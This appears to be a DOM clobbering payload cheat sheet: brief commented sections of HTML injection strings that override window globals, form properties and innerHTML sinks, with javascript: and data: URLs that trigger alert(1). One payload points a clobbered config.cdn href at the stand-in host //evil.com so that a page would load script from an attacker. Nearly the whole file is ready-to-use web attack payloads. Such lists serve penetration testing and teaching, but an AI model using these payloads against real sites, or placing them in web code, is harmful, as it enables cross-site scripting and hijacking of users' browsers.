# ---- Global Variable Override ----
# Clobber window.x by injecting: <img name=x>
<img name=x>
<input name=x>
<form name=x></form>
<a id=x></a>
<iframe name=x></iframe>
<embed name=x>
<object id=x></object>

# ---- Clobber innerHTML Sink ----
# If code does: element.innerHTML = config.cdn + '/path'
# Inject: <a id=config><a id=config name=cdn href="//evil.com">
<a id=config><a id=config name=cdn href="javascript:alert(1)">
<a id=config><a id=config name=cdn href="//evil.com">

# ---- Clobber document.body ----
# document.body is read-only but its properties aren't always
<form id=body><input name=id value=clobbered></form>

# ---- Clobber window.name ----
# Set via: <iframe name="payload" src="https://target.com">
<iframe name="[object Object]" src="https://target.com"></iframe>

# ---- Clobber HTMLFormElement ----
<form id=x><input name=action value=javascript:alert(1)></form>
<form id=x><input name=method value=CONNECT></form>

# ---- Clobber alert/confirm/prompt ----
<script>window.alert=function(){}</script>

# ---- Anchor href as String Source ----
# <a id=x href="javascript:alert(1)">
# If code does: location = x.href  OR  x.toString()
<a id=x href="javascript:alert(1)">click</a>
<a id=x href="data:text/html,<script>alert(1)</script>">x</a>

# ---- Named Form Inputs ----
<form id=x><input name=nodeName><input name=innerHTML value=<img/onerror=alert(1)>></form>
